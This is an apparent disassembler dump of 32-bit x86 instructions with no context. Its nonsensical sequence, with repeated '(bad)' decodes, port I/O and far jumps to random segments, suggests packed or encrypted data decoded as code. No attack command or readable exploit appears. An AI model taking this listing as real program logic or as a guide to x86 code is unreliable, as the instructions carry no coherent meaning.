  41c1d8:	in     al,dx
  41c1d9:	pop    ebp
  41c1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1db:	dec    esi
  41c1dc:	loope  0x41c1a4
  41c1de:	jo     0x41c1e1
  41c1e0:	xchg   ecx,eax
  41c1e1:	push   ebx
  41c1e2:	test   eax,0x7cdb8ccc
  41c1e7:	xor    al,BYTE PTR [eax+0x2a]
  41c1ea:	mov    bl,0xc6
  41c1ec:	inc    esp
  41c1ed:	xchg   esp,eax
  41c1ee:	es sub bh,dl
  41c1f1:	sub    edx,DWORD PTR [ecx]
  41c1f3:	mov    ecx,ebp
  41c1f5:	xchg   edx,eax
  41c1f6:	xsha1  
  41c1f9:	repz pop ecx
  41c1fb:	or     bl,bh
  41c1fd:	movsx  ebp,WORD PTR [esi+0x42246e43]
  41c204:	pop    esi
  41c205:	dec    edx
  41c206:	sar    BYTE PTR [edx],0x96
  41c209:	or     al,0xcb
  41c20b:	jecxz  0x41c233
  41c20d:	ret    0x5f71
  41c210:	push   esp
  41c211:	(bad)  
  41c213:	xor    ebp,edi
  41c215:	fiadd  WORD PTR [edx-0x790ba196]
  41c21b:	add    bl,BYTE PTR [edx+0x41]
  41c21e:	pop    esp
  41c21f:	and    dl,BYTE PTR [ebp+0x7c451129]
  41c225:	out    dx,eax
  41c226:	mov    ecx,0x1be16da0
  41c22b:	inc    edx
  41c22c:	sub    BYTE PTR [eax],0xf
  41c22f:	mov    ds:0x46b17245,al
  41c234:	jns    0x41c2af
  41c236:	ja     0x41c281
  41c238:	cmp    al,0x3f
  41c23a:	or     DWORD PTR [esp+esi*4-0x3a32d7fa],esp
  41c241:	or     BYTE PTR [eax],al
  41c243:	into   
  41c244:	int    0xdf
  41c246:	outs   dx,DWORD PTR ds:[esi]
  41c247:	pop    es
  41c248:	out    0xd6,al
  41c24a:	xchg   DWORD PTR [edx+0x3bcf71c],eax
  41c250:	retf   0xdf5c
  41c253:	xor    eax,0xcbbaaf12
  41c258:	ins    BYTE PTR es:[edi],dx
  41c259:	adc    al,0xac
  41c25b:	popf   
  41c25c:	ret    0x1f7c
  41c25f:	inc    eax
  41c260:	sbb    al,BYTE PTR [edi]
  41c262:	in     eax,0xa5
  41c264:	xchg   esi,eax
  41c265:	push   ecx
  41c266:	loop   0x41c290
  41c268:	sbb    al,0x23
  41c26a:	pop    ecx
  41c26b:	fnstsw WORD PTR [eax]
  41c26d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c26e:	mov    edi,0x148324ae
  41c273:	fild   DWORD PTR [ecx]
  41c275:	nop
  41c276:	dec    ecx
  41c277:	xchg   esi,eax
  41c278:	or     DWORD PTR [ebp-0x45],esi
  41c27b:	out    dx,al
  41c27c:	fs ret 0x3999
  41c280:	xchg   edi,eax
  41c281:	push   esp
  41c282:	cdq    
  41c283:	mov    BYTE PTR [edi+0x14fedb77],0xed
  41c28a:	cmp    eax,edx
  41c28c:	mov    bl,0x7c
  41c28e:	ins    BYTE PTR es:[edi],dx
  41c28f:	push   0x8
  41c291:	dec    ebx
  41c292:	ret    0x1632
  41c295:	out    0x42,al
  41c297:	cmc    
  41c298:	pop    es
  41c299:	xchg   BYTE PTR [esi+0x59d8de1c],bh
  41c29f:	call   0x3726:0x8ef7318e
  41c2a6:	mov    bl,BYTE PTR [edx+eiz*4]
  41c2a9:	mov    WORD PTR [edx+0x67b3c31e],fs
  41c2af:	fwait
  41c2b0:	dec    eax
  41c2b1:	mov    ss,WORD PTR [ebx+0x14]
  41c2b4:	xor    bl,dl
  41c2b6:	pop    ebp
  41c2b7:	and    al,0x35
  41c2b9:	dec    ebp
  41c2ba:	push   ss
  41c2bb:	repnz xchg esi,eax
  41c2bd:	popf   
  41c2be:	lock sub eax,DWORD PTR [edx]
  41c2c1:	xchg   esi,eax
  41c2c2:	shr    BYTE PTR [ecx+0x5],1
  41c2c5:	add    esi,DWORD PTR [ecx-0x2c45ac2a]
  41c2cb:	sub    edi,edi
  41c2cd:	imul   edi,DWORD PTR [ebp+0x1d],0x74c2890a
  41c2d4:	scas   eax,DWORD PTR es:[edi]
  41c2d5:	jmp    0x5c98:0x714139ae
  41c2dc:	outs   dx,DWORD PTR ds:[esi]
  41c2dd:	in     eax,0xd6
  41c2df:	(bad)  
  41c2e0:	ins    DWORD PTR es:[edi],dx
  41c2e1:	shl    DWORD PTR [ecx+0x673e2dae],1
  41c2e7:	test   ebp,0x48dd1fa8
  41c2ed:	mov    edx,0x57ff6fa
  41c2f2:	addr16 sbb ebx,esp
  41c2f5:	xchg   esi,eax
  41c2f6:	dec    edi
  41c2f7:	cmc    
  41c2f8:	(bad)  
  41c2f9:	das    
  41c2fa:	sub    cl,BYTE PTR [ebp+0x50]
  41c2fd:	outs   dx,BYTE PTR ds:[esi]
  41c2fe:	or     edi,0x9
  41c301:	(bad)  
  41c302:	pop    ebp
  41c303:	xor    DWORD PTR [ebx+0xd14ba65],ecx
  41c309:	dec    esi
  41c30a:	sbb    bl,bh
  41c30c:	xlat   BYTE PTR ds:[ebx]
  41c30d:	repnz inc esi
  41c30f:	cwde   
  41c310:	leave  
  41c311:	jmp    0x41c339
  41c313:	outs   dx,DWORD PTR ds:[esi]
  41c314:	jb     0x41c32f
  41c316:	ds ins DWORD PTR es:[edi],dx
  41c318:	ret    
  41c319:	(bad)  [edi]
  41c31b:	ret    
  41c31c:	stos   BYTE PTR es:[edi],al
  41c31d:	cdq    
  41c31e:	cs push ebp
  41c320:	xchg   DWORD PTR [ebp-0x61],ebx
  41c323:	popf   
  41c324:	outs   dx,BYTE PTR ds:[esi]
  41c325:	push   cs
  41c326:	(bad)  
  41c327:	mov    al,BYTE PTR [edi-0x79219f38]
  41c32d:	mov    WORD PTR [edi+0x425fd619],gs
  41c333:	call   0xa8dc38e2
  41c338:	and    eax,0x21b2ca47
  41c33d:	or     eax,0xe23f92fa
  41c342:	daa    
  41c343:	xchg   eax,esp
  41c345:	bound  ecx,QWORD PTR [esi-0x10]
  41c348:	ins    DWORD PTR es:[edi],dx
  41c349:	fsubr  QWORD PTR ds:0x262a5c6a
  41c34f:	(bad)  
  41c350:	outs   dx,DWORD PTR ds:[esi]
  41c351:	add    DWORD PTR [ebx+esi*2-0x4691fb28],edx
  41c358:	arpl   WORD PTR [eax],dx
  41c35a:	sbb    dl,BYTE PTR [ecx-0x26d54282]
  41c360:	cld    
  41c361:	inc    ebx
  41c362:	fcmovnbe st,st(4)
  41c364:	mov    eax,ebx
  41c366:	lea    esi,[ebx+0x26]
  41c369:	sbb    bl,BYTE PTR [edi-0x6a58a731]
  41c36f:	pop    ebx
  41c370:	sbb    ah,BYTE PTR [ecx+0x77]
  41c373:	lahf   
  41c374:	jb     0x41c342
  41c376:	cli    
  41c377:	dec    edx
  41c378:	pop    ss
  41c379:	mov    ch,0x86
  41c37b:	jecxz  0x41c32e
  41c37d:	jmp    0xb63e7722
  41c382:	dec    esp
  41c383:	dec    esi
  41c384:	les    edx,FWORD PTR [eax+0x3c252df5]
  41c38a:	push   eax
  41c38b:	aam    0x15
  41c38d:	cmp    eax,DWORD PTR cs:[edi]
  41c390:	sbb    BYTE PTR [edi+ebx*4],ah
  41c393:	sbb    bl,BYTE PTR [ebp+0x1eba3593]
  41c399:	pop    ds
  41c39a:	adc    al,0xca
  41c39c:	ja     0x41c329
  41c39e:	mov    bh,BYTE PTR [eax]
  41c3a0:	cdq    
  41c3a1:	inc    esi
  41c3a2:	aaa    
  41c3a3:	into   
  41c3a4:	lock js 0x41c425
  41c3a7:	mov    WORD PTR ds:0x3eb3c4db,?
  41c3ad:	mov    edx,0xdff45638
  41c3b2:	sbb    DWORD PTR [edi],esp
  41c3b4:	add    edi,DWORD PTR [esi+eax*2-0x39]
  41c3b8:	mov    al,0x78
  41c3ba:	mov    esp,0x153f8a31
  41c3bf:	aam    0xfa
  41c3c1:	mov    ecx,0xd4990241
  41c3c6:	(bad)  
  41c3c8:	std    
  41c3c9:	xchg   edi,eax
  41c3ca:	in     al,dx
  41c3cb:	dec    ebx
  41c3cc:	push   eax
  41c3cd:	sub    DWORD PTR [ecx+0x4f],edx
  41c3d0:	xor    eax,0x232477c3
  41c3d5:	retf   0x7e03
  41c3d8:	xchg   esp,eax
  41c3d9:	or     esp,DWORD PTR [edi]
  41c3db:	inc    ebx
  41c3dc:	ret    
  41c3dd:	out    0x2f,al
  41c3df:	(bad)  
  41c3e0:	cdq    
  41c3e1:	iret   
  41c3e2:	in     eax,0x3e
  41c3e4:	inc    esp
  41c3e5:	retf   0xf482
  41c3e8:	cmp    WORD PTR [ebp+0x68ac7b87],cx
  41c3ef:	out    0xf8,al
  41c3f1:	imul   BYTE PTR [eax-0x3f]
  41c3f4:	(bad)  
  41c3f5:	pop    esp
  41c3f6:	or     BYTE PTR [eax],0xbd
  41c3f9:	mov    eax,0xf762f153
  41c3fe:	xchg   edx,eax
  41c3ff:	pop    esi
  41c400:	sbb    cl,bl
  41c402:	idiv   ebp
  41c404:	add    ah,bl
  41c406:	enter  0x352d,0x18
  41c40a:	jb     0x41c47c
  41c40c:	mov    WORD PTR ds:0x2274546d,?
  41c412:	jmp    0x89692449
  41c417:	jnp    0x41c3a6
  41c419:	movd   mm3,edi
  41c41c:	or     DWORD PTR [edi+0x64a99a27],0x10
  41c423:	pop    ds
  41c424:	imul   esi,DWORD PTR [esi+0x7289e5e0],0x5e
  41c42b:	pop    esp
  41c42c:	sbb    dl,bl
  41c42e:	int    0xc2
  41c430:	outs   dx,DWORD PTR ds:[esi]
  41c431:	imul   ecx,DWORD PTR [ebp-0x4],0xffffff81
  41c435:	cli    
  41c436:	ss pop ebx
  41c438:	xchg   esi,eax
  41c439:	adc    al,0xa2
  41c43b:	push   0x3dfc637
  41c440:	loop   0x41c435
  41c442:	cmp    esp,DWORD PTR [ecx-0x51]
  41c445:	cdq    
  41c446:	push   esp
  41c447:	pop    ecx
  41c448:	lods   eax,DWORD PTR cs:[esi]
  41c44a:	popa   
  41c44b:	call   0x23e0:0xdcff7c0e
  41c452:	dec    ebp
  41c453:	aam    0x7
  41c455:	enter  0x704e,0x36
  41c459:	popa   
  41c45a:	aad    0x70
  41c45c:	jb     0x41c46f
  41c45e:	js     0x41c4be
  41c460:	mov    eax,ds:0x63d7431f
  41c465:	push   cs
  41c466:	mov    ds:0x1a132555,eax
  41c46b:	sbb    al,0x6a
  41c46e:	pop    ecx
  41c46f:	mov    ecx,0x114de93b
  41c474:	pop    es
  41c475:	aas    
  41c476:	je     0x41c4e7
  41c478:	repnz das 
  41c47a:	jmp    0xe74e393d
  41c47f:	pop    ecx
  41c480:	jg     0x41c4df
  41c482:	scas   eax,DWORD PTR es:[edi]
  41c483:	pop    eax
  41c484:	xchg   esp,eax
  41c485:	dec    ebx
  41c486:	mov    BYTE PTR [edx-0xf],bh
  41c489:	mov    ds:0x12a9ceca,al
  41c48e:	stos   BYTE PTR es:[edi],al
  41c48f:	xchg   edi,eax
  41c490:	cdq    
  41c491:	out    0x6e,al
  41c493:	or     dh,BYTE PTR [eax+edi*4]
  41c496:	and    bl,BYTE PTR [esi+0x7d]
  41c499:	arpl   ax,sp
  41c49b:	adc    al,0x6b
  41c49d:	ret    
  41c49e:	or     BYTE PTR [ecx+0x50ecfa40],bl
  41c4a4:	ret    
  41c4a5:	inc    edx
  41c4a6:	inc    edx
  41c4a7:	mov    cl,al
  41c4a9:	aas    
  41c4aa:	sub    esi,DWORD PTR [edi+0x59]
  41c4ad:	sub    BYTE PTR [esi],0x9e
  41c4b0:	sahf   
  41c4b1:	loopne 0x41c510
  41c4b3:	aam    0x37
  41c4b5:	stc    
  41c4b6:	fdiv   QWORD PTR [edi]
  41c4b8:	jns    0x41c497
  41c4ba:	push   edx
  41c4bb:	(bad)  
  41c4bc:	fcom   QWORD PTR [esp+eax*8+0xf156275]
  41c4c3:	mov    DWORD PTR [edi+edx*8-0x79],ebp
  41c4c7:	mov    eax,ds:0x54791377
  41c4cc:	sti    
  41c4cd:	stos   BYTE PTR es:[edi],al
  41c4ce:	xchg   ebx,eax
  41c4cf:	mov    ds:0x93f66930,al
  41c4d4:	retf   
  41c4d5:	and    al,0x8
  41c4d7:	lods   eax,DWORD PTR ds:[esi]
  41c4d8:	mov    ?,WORD PTR [esi+0x3674fb0c]
  41c4de:	and    cl,BYTE PTR [edx-0x29d55b84]
  41c4e4:	mov    cl,0xdd
  41c4e6:	mov    dh,0x64
  41c4e8:	xchg   DWORD PTR [eax],ecx
  41c4ea:	pusha  
  41c4eb:	pusha  
  41c4ec:	sub    BYTE PTR [ecx+0x9],cl
  41c4ef:	cwde   
  41c4f0:	jae    0x41c4b1
  41c4f2:	cmp    DWORD PTR [esi+0x5dbe2102],0x71
  41c4f9:	sbb    BYTE PTR [edi-0x2806c2e3],0x86
  41c500:	mov    ah,0x1b
  41c502:	mov    al,0x5b
  41c504:	and    BYTE PTR [ebp+0x23bb85ec],0xd0
  41c50b:	adc    bp,WORD PTR [edi-0x33189057]
  41c512:	mov    edx,0x9a191611
  41c517:	bound  esp,QWORD PTR [ebx+0x3cab39c5]
  41c51d:	push   cs
  41c51e:	mov    edx,0xf0cece8b
  41c523:	pop    edx
  41c524:	adc    DWORD PTR [edi+ebx*2-0x3c],edx
  41c528:	jmp    0x41c536
  41c52a:	push   ebx
  41c52b:	mov    ds:0x59b5a3f8,al
  41c530:	pop    ebx
  41c531:	cli    
  41c532:	rcl    BYTE PTR [edi+edi*1-0x48eb9ff7],cl
  41c539:	inc    esp
  41c53a:	pop    edx
  41c53b:	sub    BYTE PTR [ebx],bh
  41c53d:	add    al,0xa9
  41c53f:	jno    0x41c579
  41c541:	inc    eax
  41c542:	jno    0x41c545
  41c544:	add    BYTE PTR [esi+0x4a],bl
  41c547:	cmp    edx,DWORD PTR [eax]
  41c549:	xchg   ecx,eax
  41c54a:	add    dl,BYTE PTR [ebx]
  41c54c:	jae    0x41c55b
  41c54e:	xor    DWORD PTR [edi+esi*4-0x56],edx
  41c552:	mov    esp,0xbf2452d0
  41c557:	xlat   BYTE PTR ds:[ebx]
  41c558:	or     eax,0xdeff0eed
  41c55d:	imul   eax,edi,0xdc393507
  41c563:	loopne 0x41c515
  41c565:	jno    0x41c53d
  41c567:	ins    BYTE PTR es:[edi],dx
  41c568:	xchg   ecx,eax
  41c569:	out    0xa3,eax
  41c56b:	dec    edi
  41c56c:	push   ds
  41c56d:	jb     0x41c500
  41c56f:	push   es
  41c570:	cmp    cl,BYTE PTR [ecx+0x7fb05ce7]
  41c576:	mov    DWORD PTR [ebx-0x178e5de2],esp
  41c57c:	dec    eax
  41c57d:	clc    
  41c57e:	mov    fs,WORD PTR [ebx]
  41c580:	xchg   edi,eax
  41c581:	push   edi
  41c582:	mov    ecx,0x2f3c832b
  41c587:	mov    eax,0xe8e229d0
  41c58c:	mov    edx,0x4e927a72
  41c591:	push   ebp
  41c592:	push   ecx
  41c593:	fldcw  WORD PTR [ecx-0x80]
  41c596:	sar    BYTE PTR [ebx],cl
  41c598:	xor    edx,edi
  41c59a:	call   0x5710:0xbea02de8
  41c5a1:	sub    DWORD PTR [eax+0x553b80f7],ecx
  41c5a7:	into   
  41c5a8:	stos   BYTE PTR es:[edi],al
  41c5a9:	addr16 int3 
  41c5ab:	fnsave [esi+eax*8]
  41c5ae:	mov    WORD PTR [edi-0x43],es
  41c5b1:	sahf   
  41c5b2:	in     eax,dx
  41c5b3:	or     esi,edx
  41c5b5:	ror    ebp,0x61
  41c5b8:	dec    esp
  41c5b9:	lock dec ebp
  41c5bb:	push   esp
  41c5bc:	mov    bl,0x7d
  41c5be:	dec    edx
  41c5bf:	cli    
  41c5c0:	jmp    0xc280:0xe6a2a409
  41c5c7:	test   al,0xb4
  41c5c9:	add    DWORD PTR [edi-0x56],esp
  41c5cc:	out    0x53,eax
  41c5ce:	jl     0x41c57d
  41c5d0:	es ror ecx,cl
  41c5d3:	mov    ebp,0x32b46bdc
  41c5d8:	loop   0x41c5d9
  41c5da:	mov    esi,0xb9771086
  41c5df:	pop    ecx
  41c5e0:	imul   esp,DWORD PTR [edx+0x25fb2a5],0xf275f251
  41c5ea:	mov    esp,0x284b60f5
  41c5ef:	loopne 0x41c5c0
  41c5f1:	and    edx,eax
  41c5f3:	call   0x33e76c8f
  41c5f8:	mov    ss,WORD PTR [ebx]
  41c5fa:	pop    ebp
  41c5fb:	push   ebx
  41c5fc:	inc    esi
  41c5fd:	and    DWORD PTR [edx-0x10768227],0x24a3d378
  41c607:	mov    sp,0x813f
  41c60b:	nop    DWORD PTR [edi+0x65e79f4a]
  41c612:	lds    ebx,FWORD PTR [edx+0x17]
  41c615:	inc    edx
  41c616:	cwde   
  41c617:	and    DWORD PTR [ecx+0x5acbdf73],edi
  41c61d:	test   al,0xed
  41c61f:	mov    ss,WORD PTR [ebx+0x14]
  41c622:	lds    edi,FWORD PTR [ebx-0x1e5f0875]
  41c628:	xor    bh,0xa9
  41c62b:	inc    ecx
  41c62c:	mov    fs,edx
  41c62e:	xor    bl,BYTE PTR [edi]
  41c630:	or     DWORD PTR [esi+0x67164f86],edi
  41c636:	mov    esi,0x447fd5dd
  41c63b:	adc    esp,DWORD PTR ds:0xfc8d2c9c
  41c641:	inc    edx
  41c642:	push   esp
  41c643:	sbb    al,0x72
  41c645:	mov    edx,0x48e64c85
  41c64a:	rcr    DWORD PTR [esi-0x4050397],0xe6
  41c651:	sti    
  41c652:	xchg   esi,eax
  41c653:	pop    ss
  41c654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c655:	sbb    esi,ecx
  41c657:	and    DWORD PTR [edx+0x5c914a51],eax
  41c65d:	jmp    0xa74e60b2
  41c662:	mov    ebp,0xc8ce1d04
  41c667:	lock jl 0x41c67c
  41c66a:	sub    esi,esp
  41c66c:	push   ds
  41c66d:	sub    ebp,DWORD PTR [edi]
  41c66f:	add    al,dl
  41c671:	out    0x71,eax
  41c673:	sub    ecx,ebp
  41c675:	mov    eax,0x7c9dced
  41c67a:	or     eax,DWORD PTR [esi-0xb]
  41c67d:	inc    esi
  41c67e:	push   ebx
  41c67f:	adc    ch,BYTE PTR [esi]
  41c681:	mov    gs,WORD PTR [eax]
  41c683:	sar    BYTE PTR [esi-0x2a498ef5],0x20
  41c68a:	cmp    DWORD PTR [edx-0x1a],esi
  41c68d:	ins    BYTE PTR es:[edi],dx
  41c68e:	rol    ebx,cl
  41c690:	loop   0x41c695
  41c692:	test   DWORD PTR [eax+0x6ab81bee],eax
  41c698:	and    al,0x42
  41c69a:	dec    esp
  41c69b:	icebp  
  41c69c:	loope  0x41c6fc
  41c69e:	cmp    BYTE PTR [ebx-0x79],ah
  41c6a1:	pusha  
  41c6a2:	xchg   ebp,eax
  41c6a3:	out    dx,eax
  41c6a4:	cmp    DWORD PTR [ebx+ebx*8-0x3a],esi
  41c6a8:	mov    eax,ds:0xdd28a643
  41c6ad:	aas    
  41c6ae:	push   eax
  41c6af:	dec    esi
  41c6b0:	mov    ds:0x8b5d58ca,al
  41c6b5:	or     al,0xa1
  41c6b7:	lods   eax,DWORD PTR ds:[esi]
  41c6b8:	xlat   BYTE PTR ds:[ebx]
  41c6b9:	mov    al,0xe0
  41c6bb:	cmp    al,0xa5
  41c6bd:	in     al,dx
  41c6be:	inc    ecx
  41c6bf:	mov    bl,0xfd
  41c6c1:	call   0x9707:0xc6ed8f
  41c6c8:	in     al,0xba
  41c6ca:	pusha  
  41c6cb:	(bad)  
  41c6cc:	and    ecx,DWORD PTR [edx+0x31]
  41c6cf:	cs mov ecx,0xc2019fa8
  41c6d5:	push   DWORD PTR [edi+0x5b]
  41c6d8:	push   esp
  41c6d9:	stos   DWORD PTR es:[edi],eax
  41c6da:	and    al,0x8
  41c6dc:	rcl    BYTE PTR [ebx+0x2d5dacc3],1
  41c6e2:	and    dh,BYTE PTR [esi]
  41c6e4:	mov    ebp,0xadb2fbd9
  41c6e9:	int    0x74
  41c6eb:	in     al,0xeb
  41c6ed:	sub    al,0xa7
  41c6ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f0:	mov    ebp,DWORD PTR [ebx]
  41c6f2:	les    edx,FWORD PTR [ecx+0x5defc136]
  41c6f8:	mov    eax,0xfd782dbb
  41c6fd:	dec    edx
  41c6fe:	and    ebp,ecx
  41c700:	outs   dx,DWORD PTR ds:[esi]
  41c701:	rol    BYTE PTR [esi+eiz*4],cl
  41c704:	mov    al,0x8a
  41c706:	leave  
  41c707:	xchg   ebx,eax
  41c708:	repnz push ss
  41c70a:	test   DWORD PTR [edi+0x4a],eax
  41c70d:	inc    edx
  41c70e:	mov    ebx,0x1f78cb49
  41c713:	js     0x41c726
  41c715:	dec    ebp
  41c716:	sub    ecx,ebx
  41c718:	add    al,0x29
  41c71a:	scas   eax,DWORD PTR es:[edi]
  41c71b:	fs iret 
  41c71d:	sti    
  41c71e:	pop    ebx
  41c71f:	mov    ds:0xcfc049d1,al
  41c724:	add    eax,0xfa69366c
  41c729:	dec    eax
  41c72a:	sbb    al,0xb6
  41c72c:	xchg   BYTE PTR [ecx],al
  41c72e:	pop    ecx
  41c72f:	dec    ecx
  41c730:	gs loopne 0x41c79b
  41c733:	sbb    DWORD PTR [edx-0x61],eax
  41c736:	push   ss
  41c737:	mov    bl,0xa7
  41c739:	ins    BYTE PTR es:[edi],dx
  41c73a:	sub    al,0x3b
  41c73c:	xchg   ebp,eax
  41c73d:	and    ecx,DWORD PTR [esi-0x2e0e9be0]
  41c743:	shl    BYTE PTR [eax-0x60fa7714],1
  41c749:	xchg   esi,eax
  41c74a:	and    BYTE PTR [edx-0x3ee97114],ah
  41c750:	pushf  
  41c751:	sub    al,0x95
  41c753:	push   ebx
  41c754:	jp     0x41c6d6
  41c756:	and    bh,BYTE PTR [esi]
  41c758:	mov    ebp,0x23a63c50
  41c75d:	inc    edi
  41c75e:	dec    edx
  41c75f:	lock mov cl,BYTE PTR [edi]
  41c762:	add    DWORD PTR ds:0x1259722e,ebp
  41c768:	mov    esp,0x2fbe9c97
  41c76d:	mov    edx,0x871e90ce
  41c772:	neg    ebx
  41c774:	dec    BYTE PTR [edx+0x7e]
  41c777:	mov    esp,0x675d6994
  41c77c:	jbe    0x41c7a0
  41c77e:	jmp    0x4c42:0x937d76ab
  41c785:	mov    bl,0x76
  41c787:	out    dx,al
  41c788:	into   
  41c789:	aam    0xa0
  41c78b:	fisubr DWORD PTR [ebx-0x2c]
  41c78e:	jp     0x41c78f
  41c790:	adc    DWORD PTR [ebx+ebx*1-0x48],ebx
  41c794:	mov    edi,0x838cd656
  41c799:	add    edx,0xffffffb4
  41c79c:	lods   al,BYTE PTR ds:[esi]
  41c79d:	sar    edx,cl
  41c79f:	xor    eax,0xa6146a8d
  41c7a5:	cmp    bl,BYTE PTR [esi-0x74]
  41c7a8:	cmp    BYTE PTR [edi+0x3f136764],bl
  41c7ae:	adc    eax,eax
  41c7b0:	ror    ch,0x4d
  41c7b3:	sub    BYTE PTR [ebx+0x2c],0x1c
  41c7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7b8:	or     ch,BYTE PTR [ebp-0x48]
  41c7bb:	inc    ecx
  41c7bc:	stc    
  41c7bd:	je     0x41c7a1
  41c7bf:	adc    bl,bh
  41c7c1:	push   ebp
  41c7c2:	mov    esp,0xfe9e1dc3
  41c7c7:	lock div BYTE PTR [edi]
  41c7ca:	push   edx
  41c7cb:	out    0xe,eax
  41c7cd:	in     eax,0xd8
  41c7cf:	enter  0x46df,0xd0
  41c7d3:	aas    
  41c7d4:	aad    0x3d
  41c7d6:	in     eax,dx
  41c7d7:	dec    ebp
  41c7d8:	les    eax,FWORD PTR [esi+0x1ab6b2cc]
  41c7de:	stc    
  41c7df:	adc    al,0xb
  41c7e1:	add    cl,al
  41c7e3:	jl     0x41c843
  41c7e5:	icebp  
  41c7e6:	(bad)  
  41c7e7:	enter  0xe996,0x35
  41c7eb:	imul   esp,DWORD PTR ds:[edx+0x59],0xffffffd1
  41c7f0:	sahf   
  41c7f1:	stc    
  41c7f2:	es test edx,edi
  41c7f5:	add    BYTE PTR [esi+0x6e],bh
  41c7f8:	push   0x4f
  41c7fa:	loopne 0x41c879
  41c7fc:	std    
  41c7fd:	fldcw  WORD PTR [ecx-0xc]
  41c800:	paddb  mm3,QWORD PTR [ebx]
  41c803:	mov    BYTE PTR [edi],ah
  41c805:	adc    edx,DWORD PTR [ebx+eax*8-0x37913959]
  41c80c:	add    cl,BYTE PTR [edi+0x362d30ab]
  41c812:	xchg   esi,eax
  41c813:	sar    DWORD PTR [edx],1
  41c815:	mov    dh,0x4e
  41c817:	sub    esp,edi
  41c819:	or     cl,BYTE PTR [ebp+0x3b561d36]
  41c81f:	mov    ch,0xb3
  41c821:	pop    esi
  41c822:	pop    ebp
  41c823:	jle    0x41c7b2
  41c825:	jmp    0x3a39dd2e
  41c82a:	jg     0x41c82c
  41c82c:	rcl    BYTE PTR [ecx+0x6ecbde82],cl
  41c832:	cmp    eax,0x4f8d8767
  41c837:	adc    bl,BYTE PTR [eax]
  41c839:	jae    0x41c86d
  41c83b:	ficom  WORD PTR [edx-0x364c97fc]
  41c841:	inc    eax
  41c842:	inc    ecx
  41c843:	dec    esi
  41c844:	add    BYTE PTR [esi],bh
  41c846:	cmc    
  41c847:	out    dx,eax
  41c848:	das    
  41c849:	inc    eax
  41c84a:	rcl    DWORD PTR [edi+0x44],cl
  41c84d:	loop   0x41c85f
  41c84f:	shl    dh,0x9e
  41c852:	sub    edi,DWORD PTR [edi-0x5506c263]
  41c858:	sub    bl,BYTE PTR [edx+0x4271bb62]
  41c85e:	mov    cl,0x86
  41c860:	ret    
  41c861:	fisub  DWORD PTR [ebx+0x25]
  41c864:	add    al,0xf2
  41c866:	mov    ch,0xa0
  41c868:	cmp    edx,DWORD PTR [eax]
  41c86a:	xchg   esp,eax
  41c86b:	lods   al,BYTE PTR ds:[esi]
  41c86c:	retf   0x88a6
  41c86f:	arpl   sp,di
  41c871:	pop    eax
  41c872:	out    dx,al
  41c873:	cmp    DWORD PTR [edi],ebx
  41c875:	adc    esp,ecx
  41c877:	and    al,BYTE PTR [edx-0x2c]
  41c87a:	scas   eax,DWORD PTR es:[edi]
  41c87b:	iret   
  41c87c:	imul   edx,DWORD PTR [ecx],0x337e051d
  41c882:	mov    WORD PTR [eax],gs
  41c884:	call   0x4732991a
  41c889:	aad    0xb6
  41c88b:	cmp    al,0x70
  41c88d:	ss addr16 pushf 
  41c890:	cld    
  41c891:	es cs mov bh,0xc3
  41c895:	loope  0x41c83e
  41c897:	jl     0x41c8a0
  41c899:	data16 xor BYTE PTR [edi-0x203c3640],dl
  41c8a0:	push   ecx
  41c8a1:	push   0xffffffb2
  41c8a3:	scas   eax,DWORD PTR es:[edi]
  41c8a4:	fst    DWORD PTR ds:0x461d4f0a
  41c8aa:	ror    DWORD PTR [edi],0xf2
  41c8ad:	(bad)  
  41c8ae:	inc    ebp
  41c8af:	lea    esi,[ebx]
  41c8b1:	stc    
  41c8b2:	rcr    BYTE PTR [edi-0x23365a78],1
  41c8b8:	push   0x97e9850a
  41c8bd:	jle    0x41c8be
  41c8bf:	test   al,0x5e
  41c8c1:	ret    
  41c8c2:	shr    BYTE PTR [ebx-0x780e636f],1
  41c8c8:	ror    DWORD PTR [esp+ebp*1],0x6b
  41c8cc:	(bad)  
  41c8cd:	fst    st(4)
  41c8cf:	lahf   
  41c8d0:	adc    BYTE PTR ds:0x56080705,dh
  41c8d6:	cmp    BYTE PTR [ebx],cl
  41c8d8:	mov    eax,ds:0x2c0e6e6a
  41c8dd:	jo     0x41c876
  41c8df:	push   ecx
  41c8e0:	in     al,0x17
  41c8e2:	fs pop es
  41c8e4:	mov    cl,BYTE PTR [esi]
  41c8e6:	enter  0xeaef,0xaf
  41c8ea:	mov    ds:0x2add1662,eax
  41c8ef:	adc    al,0xa0
  41c8f1:	jno    0x41c8ae
  41c8f3:	inc    ebp
  41c8f4:	call   0xc4acf94a
  41c8f9:	test   al,0xdd
  41c8fb:	sub    al,0xb2
  41c8fd:	pop    edx
  41c8fe:	pop    ss
  41c8ff:	int3   
  41c900:	mov    ds:0xedcadee,eax
  41c905:	mov    DWORD PTR [ebx-0x5],ecx
  41c908:	pop    eax
  41c909:	xor    DWORD PTR [esp+edi*4+0x3e803ff],eax
  41c910:	or     bh,dl
  41c912:	ret    0xdc08
  41c915:	xlat   BYTE PTR ds:[ebx]
  41c916:	push   esi
  41c917:	push   ebp
  41c918:	dec    DWORD PTR [eax-0x7b]
  41c91b:	jl     0x41c91f
  41c91d:	int3   
  41c91e:	fwait
  41c91f:	sub    DWORD PTR [edx],0x61026e8d
  41c925:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41c927:	lea    ecx,[ecx-0x40]
  41c92a:	daa    
  41c92b:	pushf  
  41c92c:	inc    esi
  41c92d:	sbb    DWORD PTR [ebx-0x3233ec1f],edi
  41c933:	imul   DWORD PTR [ebp-0x80]
  41c936:	fadd   DWORD PTR [eax+0x1a]
  41c939:	adc    eax,0x69b2e1fb
  41c93e:	mov    edx,0x6e4fbae8
  41c943:	sti    
  41c944:	dec    ebx
  41c945:	mov    fs,WORD PTR [ebx]
  41c947:	jmp    0xd990:0xe99ba09b
  41c94e:	cmc    
  41c94f:	adc    eax,0x12202b61
  41c954:	pop    edi
  41c955:	sub    DWORD PTR [ebx-0x70fa7307],0x61
  41c95c:	ss fsubp st(6),st
  41c95f:	je     0x41c96d
  41c961:	or     al,0x3b
  41c963:	jg     0x41c9ca
  41c965:	sub    al,bh
  41c967:	int3   
  41c968:	imul   edi,DWORD PTR [eax-0x6d],0x1a132141
